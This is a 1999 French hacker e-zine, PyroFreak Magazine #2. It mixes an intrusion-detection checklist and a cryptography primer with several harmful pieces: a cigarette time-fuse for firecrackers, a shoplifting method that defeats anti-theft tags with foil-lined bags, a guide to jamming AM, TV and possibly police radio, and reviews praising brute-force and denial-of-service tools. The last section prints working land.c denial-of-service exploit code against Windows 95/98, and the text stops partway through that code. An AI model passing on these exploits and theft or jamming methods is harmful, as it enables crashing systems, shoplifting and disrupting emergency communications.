
         -::-Allons y pour la liberté d'expression!!!
            _____ _____     _     ______  ______ __ ___      _________
           |:      __ _ \  \  \  /     / |        ____ |    /   ___   |
           |      \__ _\ \  \  \/ ;   /  |;      /_ _/ |   /   /   /; |
           |   ____ __ ___\  \    :  /   |:  _        /   |   /   / : | 
           |: |              /    , /    |, | \     : \   |  :\__/    |
           |; |          ___/ .    /     |. |  \    ;  \  |  ;       /
           |___\         \________/      |___\  \__ ____\ |_________/
            ____ _ ___ __     ___   ___          ______   __    _______
           |:  _ _      ;\   |   \ \   \        /     ;| |  |  /   .  /
           |  |   \_______\  |:  _\ \_ _\      / /|   :| | ;| /      /
          _|  |___   _____   |; |__  ____     / <_|   ,| |  |/    : /
         |_|,  ___| |;   .\  |   __\ \_:__\  /   _     | |        ;/
           |: |     |:  ` /  | :|____  ____  \  / |;   | |  |\     \
           |; |     |, |\ \  | ;     \ \   ;\ \/  |:   | |: | \    .\
           |___\    |__| \_| |________\ \____\    |____| |___\ \_____\
             
                                                   Crédit: __2
26 Février 1999

	Vous devez lire ceci avant d'aller plus loin

Pyrofreakmag (et ses membres) tient a avertir les gens qui vont continuer
a lire le texte qui va suivre: Ont n'est aucunement responsable 
des actes, et meme des pensés qui pourraient etre produites par les lecteurs
de ce zine par rapport a nos articles . Nous tenons a mettre cela bien au 
clair. Si vous n'etes pas d'Accord avec cet affirmation, fermer ce texte, 
et effacer le de votre disque dur ou sur tout autres disques. Vous etes
le seul responsable de vos actes.


Comment nous rejoindre?:

Voici les moyens de rejoindre Pyrofreakmag et ses membres.

Soit sur IRC, sur #phreak.fr ,via le serveur undernet.
Soit par e-mail:  

            pyrofreakmag@hotmail.com  | Pour tous les membres            
		neuro@frphreak.com        | Pour rejoindre Neuro
		lordendrix@hotmail.com    | Pour rejoindre Endrix
		darkm0nk@rocketmail.com   | Pour rejoindre [G]r4FX
		NuClEaR@nuc99.com         | Pour rejoindre Nuclear
            fuckyou@ass.hole          | Pour le service des plaintes

Et vener visiter notre site web: http://pyrofreak.cjb.net
ou http://bill.gates.suck.trop.des.fallus.a.mon.gout.usuck.com

Si vous voulez que votre article apparaisse dans le #3, envoyer le a
pyrofreakmag@hotmail.com . Ou si vous avez des questions, des commantaires, 
des suggestions, envoyer les aussi a pyrofreakmag@hotmail.com . SVP, 
pas de question style: Comment hacker ou Comment phreaker?


 ____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                           TABLE DES MATIERES                                              
'.________  __ __ ___________ ____ ______________ ____ ___ ______ __ __

       TITRE DE L'ARTICLE                        NICK DE L'AUTEUR

      Intro                                            Neuro
      Vous vous etes fait hacké ?                      [G]r4FX
      Vol a l'étalage                                  Endrix   
      Brouillage de Fréquences                         Neuro
      Crytographie                                     [G]r4FX
      Critiques de Programmes                          Endrix
      Finger                                           [G]r4FX
      Encore les VMBs                                  Neuro
      Linux vs Windows                                 Endrix
      Conclusion                                       Neuro

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                                  Intro                     
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

Ce numero a été dur a terminer, pourquoi? C'est simple, on manque 
d'implication de la part de nos lecteurs. Ils nous faut des nouvelles idées,
de nouveaux concepts, pour aider à nous amiliorer, et cela vous pouvez nous
aider grandement. Comment? En nous donnant vos idées, vos articles, des 
commentaires, des critiques, des questions, et cela par les moyens annoncer
plus haut: (e-mail, #phreak.fr , ...). J'espere que pour le numero 3 on va
avoir beaucoup plus d'implication de votre part.

En passant, on essait de faire notre possible pour éliminer le plus possible
les fautes d'orthographes, mais plusieurs s'y glissent pareil, alors SVP, vener
pas nous les faire remarquer. En vériter, moi je m'en colisse pas mal des fautes,
c'est le contenu qui compte d'apres moi, chacun son opinion.

J'aimerais revenir sur un de mes trucs dans le #1, parce que j'ai été
capable de retrouver des informations intéressantes sur celui-ci.

C'étais le truc qu'on peu se servir d'une cigarette comme mèche, voici un 
beau graphique:


                            |=|
                            |=| ---------- filtre
                            |=|
                            | |
                            | |
                            |o| ---------- Trou pour la meche
 cigarette ------------     | |        (Exemple Petard à meche M-80)
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            | |
                            |_| ---------- Allumer ici :))

Une cigarette sans avoir été "poffer" dur en moyenne 8 min, planifier votre
"plan" par rapport a cela!


Vous etes seul responsable de vos actes!!

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                    Vous vous etes fait hacké ?
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __


Intro:  
Depuis le tous premier début du protocol tcp/ip et tout ce qui concerne 
l'I-net, une nouvelle race de "warrior" est apparut sur notre planète... 
P-e d'origine humaine ou extra-terrestre... Mais ils savent faire les choses.  
Ils n'ont aucune bombes, aucuns fusils, aucune épées... Leurs seule arme est 
leur connaissances... Voici un petit texte qui démontre brievèment comment 
savoir si on n'a été victime de leur cyber-crime....


A. Rechercher des signes que votre système peut avoir été attaqué avec
succès 

Examinez les fichiers "log" à la recherche des connexions de provenance inhabituelle ou des
activités non usuelles.

Par exemple, surveillez votre "last log", les processus de comptabilité système, tous les "logs" 
générés par syslog, et d'autres "logs" de sécurité. Si votre garde-barrière ou routeur envoit 
des "logs" dans un endroit autre que le  système victime de l'attaque, n'oubliez pas de vérifier
également ces "logs". Notez que ceci n'est pas fiable à toute épreuve car, à moins que l'enregistrement 
des "logs" ne soit permit qu'à la fin du fichier de stockage, beaucoup d'intrus éditent les fichiers de 
"logs" afin de cacher leur activité. 

Cherchez partout sur votre système des fichiers ayant un "setuid" ou "setgid" (surtout "setuid
root").

Les intrus laissent souvent des copies de /bin/sh ou /bin/time avec "setuid" afin d'avoir un 
accès "root" ultérieurement. La commande UNIX find (1) peut être utilisée pour rechercher des 
fichiers "setuid" ou "setgid". Par exemple, vous pouvez utiliser les commandes suivantes pour 
trouver des fichiers "setuid root" et "setgid kmem" sur tout le système de fichier: 

     	find / -user root -perm -4000 -print 

	find / -group kmem -perm -2000 -print 

Il est à noter que les exemples précédents recherchent sur toute l'arborescence de répertoire, y 
compris les systèmes de fichiers NFS/AFS montés. Certaines commandes find (1) supportent l'option "-xdev" 
pour éviter la recherche sur ces répertoires. Par exemple: 

	find / -user root -perm -4000 -print -xdev 

Une autre façon de chercher les fichiers "setuid" est d'utiliser la commande ncheck (8) sur chaque 
partition de disque. Par exemple, utilisez la commande suivante pour rechercher les fichiers "setuid" 
et les fichiers spéciaux sur la partition /dev/rsd0g: 

	ncheck -s /dev/rsd0g 

Testez les binaires de votre système afin d'être sûr qu'ils n'ont pas été modifiés.

Il s'est produit par le passé que des pirates ont réussi à modifier les programmes du 
système UNIX tels que login, su, telnet, netstat, ifconfig, ls, find, du, df, libc, 
sync, n'importe quels binaires référencés dans /etc/inetd.conf, et autres programmes 
critiques réseau et système ou tout autres sous-programmes des librairies partageables 
de système. Comparez les versions sur votre système avec de bonnes copies telles que 
celles fournies sur les médias d'initialisation. Soyez circonspect vis à vis de vos 
copies de sauvegarde (backup); elles peuvent elles aussi contenir des chevaux de Troie. 

Les programmes des chevaux de Troie peuvent produire les mêmes "checksum" standard et 
date que la version légitime. C'est pourquoi la commande UNIX standard sum (1) et 
les dates associés aux programmes ne sont pas suffisants pour déterminer si les 
programmes ont été remplacés. L'utilisation de cmp (1), MD5, Tripwire, et autres 
outils "checksum" cryptographiques est tout désignée pour détecter ces programmes 
de cheval de Troie, à condition que ces outils "checksum" eux-mêmes sont gardés dans 
un lieu sûr et ne sont pas modifiables par les intrus. En plus, vous pouvez peut-être 
envisager d'utiliser un outil (PGP, par exemple) afin de signer la sortie générée par 
MD5 ou Tripwire pour une référence future. 

Vérifiez vos systèmes, pour ce qui concerne l'utilisation non autorisée d'un programme de
monitorisation réseau, communément appelé le sniffeur ou sniffeur de paquet.

Les pirates peuvent utiliser un sniffeur pour capter les compte et mot de passe d'utilisateur. 
Pour information sur le sujet, voir l'avis CA-94:01 du
CERT disponible à: 

ftp://info.cert.org/pub/cert_advisories/CA-94:01.network.monitoring.attacks 



Examinez tous les fichiers lancés par cron et at.

Les pirates peuvent laisser des portes dérobées (back doors) dans les fichiers lancés par cron ou
soumis à at. Ces techniques peuvent permettre le retour des intrus sur le système (même après que 
vous pensez que vous aviez réussi à redresser votre système). Vérifiez bien aussi que tous les fichiers 
et programmes référencés (directement ou indirectement) par les "jobs cron  et at", et les fichiers 
"job" eux-mêmes ne sont pas accessibles en écriture pour tout le monde. 



Vérifiez les services non autorisés. 

Examinez les additions ou modifications non autorisées dans le fichier /etc/inetd.conf. 
En particulier, recherchez les entrées qui exécutent un programme "shell" (par exemple, 
/bin/shell ou /bin/csh) et testez tous les programmes qui sont spécifiés dans 
/etc/inetd.conf pour vérifier qu'ils sont corrects et n'ont pas été remplacés par des 
programmes cheval de Troie. 

Vérifiez également les services légitimes que vous avez désactivés dans /etc/inetd.conf. 
Les pirates peuvent réactiver un service que vous croyez avoir désactivé, ou remplacer 
le programme "inetd.conf" par un programme cheval de Troie. 

Examinez le fichier /etc/passwd sur le système et vérifiez les modifications apportées 
au fichier.

En particulier, recherchez les créations de nouveaux comptes non autorisées, les comptes sans 
mot de passe, ou les changements d'UID (surtout UID 0) sur les comptes existants. 

Vérifiez les entrées non autorisées dans vos fichiers de configuration système et réseau.

En particulier, recherchez le signe '+' et les noms de machines extérieures dans /etc/hosts.equiv, 
/etc/hosts.lpd, et dans tous les fichiers .rhosts (spécialement root, uucp, ftp, et autre compte système)
sur le système. Ces fichiers doivent être protégés en écriture pour tout le monde. De plus, 
assurez-vous que ces fichiers existaient avant toute intrusion et n'ont pas été créés par un intrus. 

Cherchez partout dans votre système des fichiers inhabituels ou cachés

Ces fichiers dont le nom commence par un point et ne sont normalement pas affichés par la commande 
ls, peuvent servir à cacher des outils et information (programmes de craquage des mots de passe, 
fichiers de mots de passe en provenance d'autres systèmes, etc.). Une technique commune sur les 
systèmes UNIX est de placer un répertoire caché dans un compte utilisateur avec un nom inhabituel, 
quelque chose comme '...' ou '.. ' (2points espace) ou '..^G' (2points control-G). Encore, une fois de plus, 
la commande find (1) peut être utilisée pour rechercher les fichiers cachés, par exemple: 

	find / -name ".. " -print -xdev 

	find / -name ".*" -print -xdev | cat -v 

Des fichiers avec '.xx' ou '.mail' comme nom ont été également utilisés (c'est à dire des fichiers 
qui ressemblent à des fichiers normaux). 

Examinez toutes les machines sur le réseau local lorsque vous recherchez des signes d'une
intrusion 

La plupart du temps, si une machine a été piratée, les autres sur le réseau l'ont été aussi. 
Ceci est spécialement vrai dans le cas des réseaux où tourne NIS et où les machines font mutuellement 
confiance, les uns aux autres, à travers l'usage des fichiers .rhosts ou /etc/hosts.equiv. Vérifiez 
donc toutes les machines avec lesquelles vos utilisateurs partagent des accès via .rhosts. 

__ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Vol a l'étalage
'.________  __ __ ___________ ____ ______________ ____Par Endrix__ __


 Dans ce petit texte, je vais vous expliquer comment ressortir avec un CD, 
un film ou même n'importe quoi qui a un petit collant magnétique dessus 
sans faire sonner l'alarme.

 C'est très simple parce que tout ce que le collant magnérique fait, c'est
qu'il retourne le signal aux machins trucks qu'il y a à la sortie de presque
toute les boutiques aujoud'hui. Moi je connais une manière de broyé ce système
pour que rien sonne. Je vous rapelle que c'est pour votre connaissance 
personnelle et non pour le pratiquer. 

 Tout ce qu'il faut : - 2 Sac en plastique pareille
                      - Papier d'allunimium

 Bon... Dans un sac, placer de papier d'alluminium partout à l'intérieur 
de manière que quand vos choses vont tombé dans le sac, les objets vont être
protégés contre les rayons. Après, entrer le 2ème sac à l'intérieur de celui-ci
pour que personne puisse voir le papier d'alluminium.

 Maintenant, vous êtes pret pour aller tout tester. Je vous conseille pour votre
première fois, d'aller dans une place "B.S." juste au cas ou il arrive quelque chose.
Mais si vous avez bien fait le travail, vous ne devriez pas avoir de problème.

- G00d fuck :)
__ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                      Brouillage de Fréquences                  
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __
Il y a quelque temps, j'étais sur le point de terminer un emmeteur-récepteur
am portatif, (cb). Jusque la tout, etais normal. Mais quand j'eu fini mon 
montage et que je testa mon emmeteur-récepteur, quelque chose de spécial si
produisi. Vous vous en douter, j'embarquais sur toute les fréquences quand 
j'emmetais, pas seulement sur le am, mais aussi la tétévision.(J'Ai pas tester
sur le FM).

Qu'est ce que ca faisais, c'est simple, tout équipement qui utilise les 
fréquences m'entioner plus haut. et qui se trouvais a moins de 500 m de
rayon avec l'emmeteur-récepteur étais tout simplement brouiller. C'étais un
brouillage intermédiaire, ce que je veux dire par ce terme, c'est qu'on
pouvais comprendre quelques mots d'une conversation sur les fréquences AM,
mais cela tres difficilement. C'étais identique pour la télévision, sauf avec
une moins grande influence. PLusieurs lignes brouillais l'écran, mais image
étais encore assez clair. (ici je parle bien entendu d'une réception avec
antenne et non cable, Satellite cé a voir). Je me suis pencher sur le
phénomene, et voila ce que j'ai réussi a comprendre de ceci.

Mon emmeteur-récepteur au départ étais équiper pour voyager (fréquences) a
1.5 km de rayon. Ce qui veut dire que la porter de la fréquence avais
diminuer de facon considérable, soit 1km. tout a coup, je me souvenu
de quelques choses qui s'étais produit en faisant mon montage. J'avais eu de
la difficulter a souder la fréquence variable. J'ai resouder ma fréquence, et 
maintenant tout fonctionnais bien, plus de brouillage d'onde. Ce qui veut
dire que le brouillage étais causer par ma fréquence qui étais mal installer.
Ce que je veux dire par mal installer, c'est que les broches avais un contact
(étain) entre eux. Cé aussi simple que ca.

Comment réaliser cela plus facilement? Avec un Walkie Talkie (cb pour enfants),
Vous avez juste a relier les 2 broches de la fréquence (standart) avec une
goute d'étain. Comment distinguer la fréquence? Cé assez simple, 90% du temps
elle est grisse ou bleu, et rectangle de face, et ovale du dessus. Je sais pas
si vous me suivez, tk. Aller lire un livre d'électro pour plus de renseignements.

Je garanti pas a 100% que cet technique fonctionne bien, mais d'apres mon 
expérience, ya beaucoup de chance. En passant si cela fonctionne pour le fm,
bein, la police communique par le FM, vous me voyer venir. En passant vous 
pouvez avoir une plus grande porter avec un plus puissant emmeteur (cé 
évident). A vous de trouver des utilités a ce projet, qui d'apres moi son 
assez nombreuses, surtout si vous etre un commerçant qui vend le cable TV,
héhé. J'me comprend.


____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Crytographie                     
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __

Introduction:

Ce texte a été écrit, pour qui la crytographie est une difficulté dans leurs
taches.  Si vous voulez que vos attaques de Hack ou Crack soit fonctionnelles, 
il va surement falloir un jour que vous faites de l'encryptage/décryptage. Ce
texte vous montre une bonne partie de ce que vous devez savoir sur la 
cryptographie.


La cryptographie :

L'Internet n'est pas sécuritaire! Cette affirmation, plusieurs fois répétée,
risque de créer une véritable paranoïa, et rend des gens réticents à utiliser
l'Internet comme moyen de communication. Il existe pourtant une technologie
de pointe qui peut apporter des solutions pour permettre de réaliser des 
transactions en toute sécurité sur l'Internet. Elle s'appelle la cryptographie.
 

Une transaction, qu'il s'agisse d'un traitement bancaire ou d'un échange de 
courrier électronique est dite sécuritaire si elle satisfait aux quatre
conditions suivantes: 

 1.Authenticité des intervenants. Lorsqu'on effectue une transaction, on veut
bien pouvoir s'assurer de l'authenticité de son correspondant. Or, à l'heure
actuelle, le courrier électronique, la technologie W3 (World Wide Web) 
le permettent, mais c'est pas super fonctionnelle. Dans le cas du courrier
électronique, il est très facile pour quiconque de modifier l'en-tête d'un
courrier électronique qui contient l'adresse de l'expéditeur pour se faire
passer pour un autre. Dans le cas du W3, la mascarade de numéro IP (IP 
spoofing) pour cacher l'identité de la connexion provenance source est plus
difficile, mais l'entreprise n'est nullement insurmontable. 
   
 2.Confidentialité de la transaction. Le fondement de la communication en
réseau de l'Internet repose essentiellement sur la suite de protocoles TCP/IP
(Transmission Control Protocol/Internet Protocol). Donc, il est très impor-
tant que TCP/IP soit sécuritaire, la version IPv6 plus robuste et plus sécu-
ritaire est maintenant utiliser par l'IETF (Internet Engineering Task Force). Toute
L'information qui transite de passerelle en passerelle sur l'Internet
circule en clair. Quiconque fait de l'écoute de réseau peut intercepter
les paquets de données et accède à l'information désirée. 
   
 3.Intégrité du message. Rien n'assure que le message est intact pendant son
transfert sur le réseau. Il pourrait bien être intercepté et modifié par 
n'importe qui sans que son propriétaire s'en rend compte. 
   
 4.Non-répudiation du message. Ca, ca veut dire la possibilité pour quelqu'un
de renier qu'il est l'auteur du message. Donc l'authentification vient d'êtres
corrompu.

Ces quatre conditions de sécurité posent de grands défis à l'Internet qui ,
pour les relever, n'a pas d'autre choix que de faire appel à des techniques
d'encryptage sophistiquées que seule la technologie la plus avancée de la
cryptographie puisse en procurer. On distingue deux grands types de
méthocryptographiques: 

 1.Méthode à clef secrète ou symétrique, dans laquelle l'algorithme utilisé
est connu de tout le monde, mais la clef utilisée reste secrète aux parties
et qui sert à la fois au cryptage et au décryptage. Les algorithmes les plus
connus qui sont classées comme pionièressont DES (Digital Encryption
Standard), Triple-DES, IDEA (International Data Encryption Algorithm), RC2,
RC4, RC5 (Rivest's Code #2, #4 #5), Skipjack etc. Si Alice veut envoyer un 
message à Robert, elle doit convenir avec ce dernier d'un algorithme et d'une
clef. La clef doit être échangée de manière sécuritaire. 
   
 2.Méthode à clef publique ou asymétrique, dans laquelle l'algorithme est
également connu des parties, mais chaque partie possède non pas une clef
mais une paire de clefs: une clef publique connue de tout le monde et une
clef privée personnelle, gardée secrète. Les algorihmes les plus connus et
ceux qui qui sont classées comme pionières sont RSA (Rivest-Shamir-Adleman),
Diffie-Hellman, Merkle-Hellman, etc. Si Alice désire communiquer avec Robert,
elle doit convenir avec celui-ci d'un algorithme et lui demande sa clef
publique. Elle crypte son message avec la clef publique de Robert avant de
l'envoyer. À la réception, Robert décrypte le message à l'aide de sa propre
clef privée. 

La méthode à clef secrète est rapide en terme de vitesse de cryptage/décryp-
tage, elle exige par contre un canal sécurisé pour la transmission des
clefs. La méthode à clef publique est lente, cent fois moins rapide que la
méthode à clef secrète, mais elle est plus robuste et dispose des
dispositifs très sécuritaires pour la distribution des clefs publiques
(serveurs, annuaires publics, centres de certification). Dans la pratique,
on utilise conjointement les deux méthodes. Il y a alors deux cryptages.
Lorsqu'Alice veut envoyer un message à Robert: 

     elle demande à Robert de lui fournir sa clef publique; 
     elle génère une clef aléatoire, appelée la clef de session; 
     elle crypte le message avec un algorithme symétrique (du type DES, par
          exemple) à l'aide de la clef de session; 
     elle crypte ensuite la clef de session avec un algorithme asymétrique
          (du type RSA, par exemple) en utilisant la clef publique de Robert; 
     elle envoie à Robert le tout, la clef de session et le message, tous les
          deux cryptés. 

Robert reçoit l'ensemble de clef de session et de message cryptés: 

     il utilise sa clef privée pour décrypter d'abord la clef de session; 
     il utilise par la suite la clef de session obtenue pour décrypter et
        obtenir finalement le message. 

Le "cryptage avec clef publique/décryptage avec clef privée" assure la
confidentialité de la transaction. Mais les trois autres critères peuvent-ils
être satisfaits? La réponse est oui, à condition qu'on ajoute des étapes à la
méthode utilisée. En fait, l'intégrité et la non-répudiation sont résolues à
l'aide de ce qu'on appelle la signature digitale (ou la signature numérique).
Contrairement au cas d'encryptage où la clef publique sert au cryptage et la
clef privée, au décryptage; dans la signature digitale c'est inverse: la clef
privée est utilisée pour le cryptage et la clef publique, pour le décryptage.
Le principe est le suivant: 

Lorsqu'Alice envoie son message à Robert, elle envoie également une signature
digitale: 

     elle utilise d'abord un algorithme spécial, appelé "hash algorithm", qui
          transforme son message de longueur quelconque en une chaîne de 
          longueur constante (un nombre de 128-bit de long). C'est ce qu'on
          appelle un "message digest". Les algorithmes les plus connus
          sont SHA (Secure Hash Algorithm), Snerfu, MD4, MD5 (Message Digest
           #4, #5), etc. L'algorithme ne fonctionne que dans une direction
          et particulièrement robuste à l'inversion: il est quasi impossible
          de retrouver le message original à partir du "message digest". 
     elle crypte ensuite le "message digest" avec sa propre clef privée et le
     transmet à Robert. 

À la réception: 

     Robert utilise la clef publique d'Alice pour décrypter le "message 
digest" pour avoir et le message et le "digest"; il calcule également 
le "digest" du message reçu. 

Si les deux "digest" sont identiques, Robert peut être certain: 

     que le message n'a pas été altéré (intégrité); 
     qu'Alice ne pourra pas répudier le message, étant donné qu'elle seule
connaît sa clef privée (non-répudiation). 

Il reste l'authenticité. Lorsqu'Alice demande à Robert de lui fournir sa clef
publique, qu'est-ce qui lui prouve que ce n'est pas quelqu'un d'autre
qui lui répond? Rien, si Robert n'a pas fait auparavant enregistrer sa clef
publique auprès d'une "autorité de certification". La démarche est
simple: 

     Robert calcule sa clef publique et sa clef privée à l'aide d'un logiciel
utilitaire (Netscape, Oracle, Pretty Good Privacy, etc.); il envoie à un 
organisme de certification (VeriSign, par exemple) sa clef publique avec
d'autres informations personnelles prouvant son identité; 

     L'organisme de certification, après vérification auprès d'une tierce 
partie pour s'assurer de l'identité de Robert, émet un certificat qui 
comporte, en autres, l'identité de Robert, sa clef publique, la date 
d'émission, etc. Le certificat est signé digitalement par l'autorité 
de certification. 
    
      Alice, lorsqu'elle veut s'assurer de l'identité de Robert, elle 
lui demande son certificat qu'elle vérifie en utilisant la clef publique de
l'autorité de certification. 

La cryptographie à clef publique est la clef des transactions sécuritaires
sur l'Internet. Elle donne naissance à plusieurs applications majeures,
parmi lesquelles se trouvent notamment le SHTTP (Secure HyperText Transfer
Protocol) de l'Enterprise Integration Technologies et le SSL (Secure Socket
Layer) de la Netscape Communications Corporation. 



____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                     Critiques de Programmes
'.________  __ __ ___________ ____ ______________ ____Par Endrix__ __



 Bon, hey bien dans ce texte je vais vous dire quels outils de hacking, 
phreaking... sont les meilleurs et lesquels sont poches. Le seul juge est
moi alors il est possible que je me trompe en disant qu'un tel prog est 
poche quand il est super bon.. C'est mon opinion personnelle alors il
faut en prendre et en laisser. Donc dans chaque ezine il va avoir un 
diagnostique sur quelque bon programme.

______________________________________________________________________
Analyse du programme   : Legion 2.11
Auteur(s)              : rhino9
URL de téléchargement  : Http://rhino9.ml.org
Note sur 10            : 7/10
Note(s) du programme(s) : Marche pas tout les coups mais la pluspart du
                          temps ca marche
Option(s)               : - Scan pour des IP's en partage de fichier
                          - Brute Force access même si le IP a un password
                          - Permet de Mapper Drive
                          - Peut mapper plusieurs IP en même temps
Fonction(s) du programme : HeY bien ce programme permet de hacker une 
                           personne qui est en partage de fichier et 
                           contient un scanneur inclus.
Commantaire(s) Additionnel(s) : N/A   
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯


______________________________________________________________________
Analyse du programme   : Genius 2
Auteur(s)              : Messiah
URL de téléchargement  : Http://www.sinnerz.com/genius/
Note sur 10            : 10/10
Note(s) du programme(s) : Aucun bug trouvé 
Option(s)               : - Internet Clients : - Finger 
    			    	               - FTP
   					       - Internet Browser
 					       - Ping
 					       - SMTP
 				               - Telnet
 					       - Time
 					       - TraceRoute
					       - Whois
                       - Internet tools : - Current Connections
 					  - Download Manager
 					  - Name Scanner
					  - NS lockup
 					  - Patience
				          - Port Info
 					  - Service Scanner
					  - Site Checker
		       - PIM : - Address Book
			       - Note 
 			       - Password
		       - Utilities : - Convertion
				     - Computer Search
				     - Password Generator
				     - UUEncode
                       - Mail Check (avec configuration)
                       - Finger Server (avec configuration)
		       - Ident Server (avec configuration)
                       - PortScan detection (avec configuration)
                       - Port Watcher (avec configuration)
		       - Stay Alive (avec configuration)
		       - HotKeys (avec configuration) 
                       - Help file

Fonction(s) du programme : Alors la, ce programme a plusieur fontions .. Il
                           très pratique pour plein de chose pour vous trouverez
                           vous même avec des choses pratiques !!
Commantaire(s) Additionnel(s) : Excellent programme que tout le monde devrait 
                                avoir !!!!
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯


___________________________________________________________________________
Analyse du programme  : Aggressor version 0.99
Auteur(s)             : Aggressor team
URL de téléchargement : http://aggressor.net
Note sur 10           : 10/10
Note(s) du programme  : Souvent quand tu ouvres le programe, il marque
                        Critical Error the program will be unstable now
                        mais moi ca marche toujours bien après.
Options(s)            :- Scanner de boite linux et de BSD
                       - Testeur du Buffet Overflow pour le count.cgi
                       - Scanneur du bug dans le CGI de faxsurvey et s'il trouve
                         le bug et démontre comment un hacker peut gagné l'access
                         au r00t avec ca.
                       - Scan la vulnérabilité dans les scriptsHTML
                       - Scan la vulnérabilité dans les scripts perl
                       - Scan la vulnérabilité des script PHP CGI
                       - Scan pour voir si vous avez et comment auter le bug 
                         du /cgi-bin/test-cgi
                       - Scan la vulnérabilité de votre WWWBoard
                       - Exploit le CGI Guess
                       - coke (denial)
                       - Scan pour l'exploit du login avec Anonymous
                       - Crash un FTP avec le Buffet Overflow 
                       - Scan les FTP de warez
                       - Scan pour le trojan GirlFriend
                       - Hanson (denial)
                       - ICMP Echo killer
                       - Kill votre Ident
                       - Land (denial)
                       - nestea (denial)
                       - NetBUS detector
                       - BackOrifice Scanner
                       - Peut aussi agir comme un FireWall
                       - Donne tout les résultats dans un beau petit tableau
                         pour que le webmaster puisse tout compredre :)
                       - Et ya plein d'autres choses que j'ai pas encore trouvé!!!
Fonction(s) du programme : Sa fonction procipale est de scanner un serveur 
                           pour y trouvé des failles que les pirates pourraient
                           exploité afin de gagner le r00t du serveur mais 
                           plusieurs personnes ont fais des librairies addon pour
                           le programme alors la je trouve que c'est plus un 
                           programme de hacking que n'importe quoi d'autre mais
                           il est toujours aussi efficace.... 
Commantaire(s) Additionnel(s) : WAW Super programme mais coute CHER !!(heehe vive le cracking =P)
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯


______________________________________________________________________
Analyse du Script      : Land.c
Auteur(s)              : m3lt, FLC
URL de téléchargement  : Http://www.rootshell.com
Note sur 10            : 8/10
Note(s) du programme(s) : Très efficace pour le monde qui sont pas patché
Option(s)               : - Crash une machine sous Win95, 98
Fonction(s) du programme : - Crash une machine sous Win95, 98
Commantaire(s) Additionnel(s) : N/A   

Voici le code : 
¯¯¯¯¯¯¯¯¯¯¯¯¯ ¯
/* land.c by m3lt, FLC
   crashes a win95 box */

#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <netinet/protocols.h>

struct pseudohdr
{
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
};

u_short checksum(u_short * data,u_short length)
{
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
}

int main(int argc,char * * argv)
{
        struct sockaddr_in sin;
        struct hostent * hoste;
        int sock;
        char buffer[40];
        struct iphdr * ipheader=(struct iphdr *) buffer;
        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
        struct pseudohdr pseudoheader;

        fprintf(stderr,"land.c by m3lt, FLC\n");

        if(argc<3)
        {
                fprintf(stderr,"usage: %s IP port\n",argv[0]);
                return(-1);
        }

        bzero(&sin,sizeof(struct sockaddr_in));
        sin.sin_family=AF_INET;

        if((hoste=gethostbyname(argv[1]))!=NULL)
                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                fprintf(stderr,"unknown host %s\n",argv[1]);
                return(-1);
        }

        if((sin.sin_port=htons(atoi(argv[2])))==0)
        {
                fprintf(stderr,"unknown port %s\n",argv[2]);
                return(-1);
        }

        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
        {
                fprintf(stderr,"couldn't allocate raw socket\n");
                return(-1);
        }

        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->version=4;
        ipheader->ihl=sizeof(struct iphdr)/4;
        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->id=htons(0xF1C);
        ipheader->ttl=255;
        ipheader->protocol=IP_TCP;
        ipheader->saddr=sin.sin_addr.s_addr;
        ipheader->daddr=sin.sin_addr.s_addr;

        tcpheader->th_sport=sin.sin_port;
        tcpheader->th_dport=sin.sin_port;
        tcpheader->th_seq=htonl(0xF1C);
        tcpheader->th_flags=TH_SYN;
        tcpheader->th_off=sizeof(struct tcphdr)/4;
        tcpheader->th_win=htons(2048);

        bzero(&pseudoheader,12+sizeof(struct tcphdr));
        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
        pseudoheader.protocol=6;
        pseudoheader.length=htons(sizeof(struct tcphdr));
        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
